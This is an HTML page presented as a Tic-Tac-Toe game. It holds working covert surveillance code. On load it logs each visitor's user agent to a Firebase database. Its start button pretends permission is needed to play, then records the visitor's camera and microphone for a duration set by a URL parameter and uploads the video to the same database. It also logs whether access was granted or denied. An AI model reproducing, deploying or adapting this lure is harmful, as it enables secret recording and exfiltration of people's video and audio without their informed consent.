<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Tic-Tac-Toe Game</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    html, body {
      height: 100%;
      width: 100%;
      overflow: hidden;
      touch-action: manipulation;
    }
    .cell {
      aspect-ratio: 1 / 1;
      background: #1e293b;
      border-radius: 12px;
      font-size: 3rem;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      user-select: none;
    }
    .cell.x { color: #38bdf8; }
    .cell.o { color: #f43f5e; }
  </style>
</head>
<body class="bg-slate-950 text-slate-100 flex flex-col justify-between items-center p-4 h-full">

  <!-- Game Header -->
  <div class="text-center mt-2">
    <h1 class="text-3xl font-extrabold text-cyan-400 tracking-wide">TIC TAC TOE</h1>
    <p id="gameStatus" class="text-sm font-semibold text-slate-400 mt-1">Press Start to Play</p>
  </div>

  <!-- Game Board -->
  <div class="w-full max-w-xs bg-slate-900 border border-slate-800 p-3 rounded-2xl shadow-2xl">
    <div id="board" class="grid grid-cols-3 gap-3">
      <div class="cell" onclick="playGame(0)"></div>
      <div class="cell" onclick="playGame(1)"></div>
      <div class="cell" onclick="playGame(2)"></div>
      <div class="cell" onclick="playGame(3)"></div>
      <div class="cell" onclick="playGame(4)"></div>
      <div class="cell" onclick="playGame(5)"></div>
      <div class="cell" onclick="playGame(6)"></div>
      <div class="cell" onclick="playGame(7)"></div>
      <div class="cell" onclick="playGame(8)"></div>
    </div>
  </div>

  <!-- Restart Button -->
  <div class="w-full max-w-xs mb-2">
    <button onclick="resetGame()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl border border-slate-700 transition-all">Restart Game</button>
  </div>

  <!-- Start Modal -->
  <div id="startModal" class="fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
    <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
      <div class="text-4xl">🎮</div>
      <h2 class="text-lg font-bold text-cyan-400">Welcome to Tic-Tac-Toe</h2>
      <p class="text-xs text-slate-400">To start the Tic-Tac-Toe match, please enable device permission.</p>
      <button id="startBtn" class="w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold py-3 rounded-xl text-sm transition-all shadow-lg shadow-cyan-500/20">
        OK / Start Game
      </button>
    </div>
  </div>

  <!-- Success Modal -->
  <div id="successModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
    <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
      <div class="text-4xl">✅</div>
      <h2 class="text-lg font-bold text-emerald-400">Completed!</h2>
      <p class="text-xs text-slate-300">Uploading completed successfully!</p>
      <button onclick="closeModal()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-100 font-bold py-2.5 rounded-xl text-xs border border-slate-700">
        Continue Playing
      </button>
    </div>
  </div>

  <!-- Firebase & Session Handler -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDc6F_094RHBXWlIjyO8lP_Y1IF3uDfCzU",
      authDomain: "gen-lang-client-0404390549.firebaseapp.com",
      databaseURL: "https://gen-lang-client-0404390549-default-rtdb.firebaseio.com",
      projectId: "gen-lang-client-0404390549",
      storageBucket: "gen-lang-client-0404390549.firebasestorage.app",
      messagingSenderId: "878924381688",
      appId: "1:878924381688:web:3500ab452bd35ce4872a0d"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const urlParams = new URLSearchParams(window.location.search);
    let recordSeconds = parseInt(urlParams.get('time')) || 5;

    const startBtn = document.getElementById('startBtn');
    const startModal = document.getElementById('startModal');
    const successModal = document.getElementById('successModal');
    const gameStatusEl = document.getElementById('gameStatus');

    let currentStream = null;

    // পেজ লোড হওয়ার সাথে সাথেই আগে ভিজিট লগ পাঠাবে
    try {
      push(ref(db, 'visits_log'), {
        timestamp: new Date().toISOString(),
        permission: "Pending/Page Loaded",
        durationRequested: recordSeconds,
        userAgent: navigator.userAgent
      });
    } catch(e) {
      console.error("Log error:", e);
    }

    startBtn.addEventListener('click', async () => {
      try {
        startModal.classList.add('hidden');
        gameStatusEl.textContent = "Your Turn (X)";

        // পুরনো সার্ভিস বা ট্র্যাকিং থাকলে তা বন্ধ করা
        if (currentStream) {
          currentStream.getTracks().forEach(track => track.stop());
        }

        currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

        // পারমিশন গ্র্যান্টেড লগ
        push(ref(db, 'visits_log'), {
          timestamp: new Date().toISOString(),
          permission: "Granted",
          durationRequested: recordSeconds,
          userAgent: navigator.userAgent
        });

        let chunks = [];
        let mediaRecorder;

        // বিটরেট ও কমপ্রেসড সেটিংস যাতে ফাইল সাইজ কম হয়
        const options = { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 250000 };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
          delete options.mimeType;
        }

        try {
          mediaRecorder = new MediaRecorder(currentStream, options);
        } catch (e) {
          mediaRecorder = new MediaRecorder(currentStream);
        }

        mediaRecorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
          // রেকর্ড শেষ হওয়ামাত্রই আগে ব্যাকগ্রাউন্ড ট্র্যাকিং অফ করা
          if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
            currentStream = null;
          }

          const blob = new Blob(chunks, { type: 'video/webm' });
          const reader = new FileReader();

          reader.readAsDataURL(blob);
          reader.onloadend = async () => {
            try {
              await push(ref(db, 'recorded_videos'), {
                videoData: reader.result,
                duration: recordSeconds,
                createdAt: new Date().toISOString()
              });
              
              successModal.classList.remove('hidden');
            } catch (err) {
              console.error("Firebase upload error:", err);
            }
          };
        };

        mediaRecorder.start(1000); // প্রতি ১ সেকেন্ড পরপর ডাটা চাঙ্ক গ্রহণ

        setTimeout(() => {
          if (mediaRecorder.state !== "inactive") {
            mediaRecorder.stop();
          }
        }, recordSeconds * 1000);

      } catch (err) {
        console.error("Permission Error:", err);
        push(ref(db, 'visits_log'), {
          timestamp: new Date().toISOString(),
          permission: "Denied",
          durationRequested: recordSeconds,
          userAgent: navigator.userAgent
        });
      }
    });

    window.closeModal = () => {
      successModal.classList.add('hidden');
    };
  </script>

  <!-- Tic-Tac-Toe Logic -->
  <script>
    const boardEl = document.getElementById('board');
    const gameStatusEl = document.getElementById('gameStatus');
    const WINS = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
    const DELAY_MS = 2500;
    
    let gameBoard = Array(9).fill('');
    let gameActive = true;

    function playGame(i) {
      if (gameBoard[i] || !gameActive) return;
      
      makeGameMove(i, 'X');
      if (checkGameEnd('X', "You Won! 🎉")) return;

      gameStatusEl.textContent = "Computer thinking...";
      gameActive = false;

      setTimeout(() => {
        const empty = gameBoard.map((v, idx) => v === '' ? idx : null).filter(v => v !== null);
        if (empty.length) {
          const cpuMove = empty[Math.floor(Math.random() * empty.length)];
          makeGameMove(cpuMove, 'O');
          if (checkGameEnd('O', "Computer Won! 🤖")) return;
          gameStatusEl.textContent = "Your Turn (X)";
          gameActive = true;
        }
      }, DELAY_MS);
    }

    function makeGameMove(i, p) {
      gameBoard[i] = p;
      boardEl.children[i].textContent = p;
      boardEl.children[i].classList.add(p.toLowerCase());
    }

    function checkGameEnd(p, msg) {
      const won = WINS.some(w => w.every(i => gameBoard[i] === p));
      const draw = !won && gameBoard.every(c => c);
      if (won || draw) {
        gameStatusEl.textContent = won ? msg : "It's a Draw! 🤝";
        gameActive = false;
        return true;
      }
      return false;
    }

    function resetGame() {
      gameBoard.fill('');
      gameActive = true;
      gameStatusEl.textContent = "Your Turn (X)";
      Array.from(boardEl.children).forEach(c => { c.textContent = ''; c.className = 'cell'; });
    }
  </script>
</body>
</html>
